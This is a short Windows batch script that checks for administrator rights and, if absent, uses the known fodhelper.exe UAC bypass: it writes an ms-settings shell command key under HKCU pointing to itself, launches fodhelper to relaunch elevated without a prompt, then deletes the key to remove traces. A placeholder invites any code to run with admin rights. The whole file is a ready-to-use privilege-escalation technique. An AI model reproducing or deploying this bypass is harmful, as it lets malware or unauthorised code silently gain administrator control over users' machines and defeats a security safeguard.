@echo off
:: SELF ELEVATING SCRIPT USING FODHELPER

net session >nul 2>&1
if %errorlevel% == 0 (
    echo.
    echo ============================================================
    echo   This CMD is running with Administrator permissions.
    echo ============================================================
    echo.
    pause
    goto main
)

:: Fodhelper Bypass
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "\"%~f0\" %*" /f >nul 2>&1

start "" "%SystemRoot%\System32\fodhelper.exe" >nul 2>&1
timeout /t 2 >nul 2>&1
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

echo [INFO] Relaunching with admin rights...
exit /b

:main
:: your code goes here
pause
